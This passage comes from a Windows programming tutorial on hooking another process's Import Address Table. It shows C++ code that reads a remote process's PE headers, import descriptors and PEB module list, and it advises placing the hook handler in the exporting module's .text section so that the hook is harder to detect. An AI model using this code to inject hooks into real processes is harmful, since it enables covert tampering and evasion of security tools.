font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pImage</span>-&gt;<span style="color:#010001">NumberOfSections</span> = </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pImage</span>-&gt;<span style="color:#010001">FileHeader</span>-&gt;<span style="color:#010001">FileHeader</span>.<span style="color:#010001">NumberOfSections</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pImage</span>-&gt;<span style="color:#010001">Sections</span> = </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (<span style="color:#010001">PIMAGE_SECTION_HEADER</span>)(<span style="color:#010001">lpBuffer</span> + <span style="color:#010001">pDOSHeader</span>-&gt;<span style="color:#010001">e_lfanew</span> + </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">sizeof</span>(<span style="color:#010001">IMAGE_NT_HEADERS32</span>));</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span> <span style="color:#010001">pImage</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">}</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black">&nbsp;</span></p>

<p class="MsoNormal" style="line-height:normal"><b><span style="font-size:14.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Finding The Remote Import Address</span></b></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;
color:black">Given the remote image header we must find the image import
descriptor for user32.dll and make our way to the ILT and IAT using
ReadProcessMemory, just as we did to acquire the remote image.</span><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black"><br>
<br>
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">PIMAGE_IMPORT_DESCRIPTOR</span><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">pImportDescriptors</span>
= <span style="color:#010001">ReadRemoteImportDescriptors</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">(</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hProcess</span>, </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pPEB</span>-&gt;<span style="color:#010001">ImageBaseAddress</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pImage</span>-&gt;<span style="color:#010001">FileHeader</span>-&gt;<span style="color:#010001">OptionalHeader</span>.<span style="color:#010001">DataDirectory</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black">[…]</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">IMAGE_IMPORT_DESCRIPTOR</span><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">descriptor</span>
= <span style="color:#010001">pImportDescriptors</span>[<span style="color:
#010001">i</span>];</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:blue">char</span><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">* <span style="color:#010001">pName</span> = <span style="color:#010001">ReadRemoteDescriptorName</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">(</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hProcess</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pPEB</span>-&gt;<span style="color:#010001">ImageBaseAddress</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;<span style="color:#010001">descriptor</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black">[…]</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:13.5pt;
font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black"><br>
</span><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;;color:#010001">PIMAGE_THUNK_DATA32</span><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">pILT</span>
= <span style="color:#010001">ReadRemoteILT</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">(</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hProcess</span>, </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pPEB</span>-&gt;<span style="color:#010001">ImageBaseAddress</span>, </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;<span style="color:#010001">descriptor</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black">[…]</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:13.5pt;
font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black"><br>
</span><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;;color:#010001">PIMAGE_THUNK_DATA32</span><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">pIAT</span>
= <span style="color:#010001">ReadRemoteIAT</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">(</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hProcess</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pPEB</span>-&gt;<span style="color:#010001">ImageBaseAddress</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;<span style="color:#010001">descriptor</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black">&nbsp;</span></p>

<p class="MsoNormal" style="line-height:normal"><b><span style="font-size:14.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Injecting Code And Patching The
IAT</span></b></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;
color:black">As was state earlier, the location of the hook handler in memory
can give away the presence of hooking. Optimally, the handler for our hook
should be located within the .text section of the module that exports the
target function. Below is a function that will allow us to find the appropriate
remote import module by name.</span><span style="font-size:13.5pt;font-family:
&quot;Times New Roman&quot;,&quot;serif&quot;;color:black"><br>
<br>
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">PVOID</span><span style="font-size:
10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">FindRemoteImageBase</span>(<span style="color:#010001">HANDLE</span> <span style="color:#010001">hProcess</span>,
<span style="color:#010001">PPEB</span> <span style="color:#010001">pPEB</span>,
<span style="color:blue">char</span>* <span style="color:#010001">pModuleName</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">{</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">PPEB_LDR_DATA</span>
<span style="color:#010001">pLoaderData</span> = <span style="color:#010001">ReadRemoteLoaderData</span>(<span style="color:#010001">hProcess</span>, <span style="color:#010001">pPEB</span>);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">PVOID</span> <span style="color:#010001">firstFLink</span> = <span style="color:#010001">pLoaderData</span>-&gt;<span style="color:#010001">InLoadOrderModuleList</span>.<span style="color:#010001">Flink</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">PVOID</span> <span style="color:#010001">fLink</span> = <span style="color:#010001">pLoaderData</span>-&gt;<span style="color:#010001">InLoadOrderModuleList</span>.<span style="color:#010001">Flink</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">PLDR_MODULE</span>
<span style="color:#010001">pModule</span> = <span style="color:blue">new</span>
<span style="color:#010001">LDR_MODULE</span>();</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">do</span> </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">BOOL</span> <span style="color:#010001">bSuccess</span> = <span style="color:#010001">ReadProcessMemory</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hProcess</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">fLink</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pModule</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">sizeof</span>(<span style="color:#010001">LDR_MODULE</span>),</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">if</span> (!<span style="color:#010001">bSuccess</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span>
0;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">PWSTR</span>
<span style="color:#010001">pwBaseDllName</span> = </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;text-indent:
.5in;line-height:normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">new</span> <span style="color:#010001">WCHAR</span>[<span style="color:#010001">pModule</span>-&gt;<span style="color:#010001">BaseDllName</span>.<span style="color:#010001">MaximumLength</span>];</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">bSuccess</span>
= <span style="color:#010001">ReadProcessMemory</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hProcess</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pModule</span>-&gt;<span style="color:#010001">BaseDllName</span>.<span style="color:#010001">Buffer</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pwBaseDllName</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pModule</span>-&gt;<span style="color:#010001">BaseDllName</span>.<span style="color:#010001">Length</span>
+ 2,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">if</span> (<span style="color:#010001">bSuccess</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">size_t</span>
<span style="color:#010001">sBaseDllName</span> = <span style="color:#010001">pModule</span>-&gt;<span style="color:#010001">BaseDllName</span>.<span style="color:#010001">Length</span>
/ 2 + 1;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">char</span>*
<span style="color:#010001">pBaseDllName</span> = <span style="color:blue">new</span>
<span style="color:blue">char</span>[<span style="color:#010001">sBaseDllName</span>];</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
